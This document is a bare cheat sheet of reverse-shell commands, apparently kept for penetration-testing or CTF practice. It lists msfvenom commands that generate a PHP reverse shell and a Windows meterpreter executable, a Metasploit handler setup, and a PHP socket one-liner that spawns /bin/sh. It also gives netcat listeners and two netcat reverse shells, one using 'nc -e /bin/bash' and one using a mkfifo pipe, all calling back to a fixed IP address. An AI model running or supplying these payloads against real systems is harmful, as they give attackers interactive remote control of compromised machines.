# http server
python3 -m http.server

# msfvenom php payload
msfvenom -p php/reverse_php LHOST=192.168.0.128 LPORT=8899 -f raw > shell.php
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.26.128 LPORT=8889 -f exe > shell.exe

# kali preinstalled scripts for shell
cd /usr/share/webshells/

# msfconsole handler
use exploit/multi/handler
set LHOST listening-ip
set LPORT listening-port

# echo php payload
echo  "#!/bin/sh\nphp -r '\$sock=fsockopen(\"192.168.0.128\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" > payload.php

# nc
nc -lnvp 8888
nc 192.168.0.128 8888 -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.128 8888 >/tmp/f

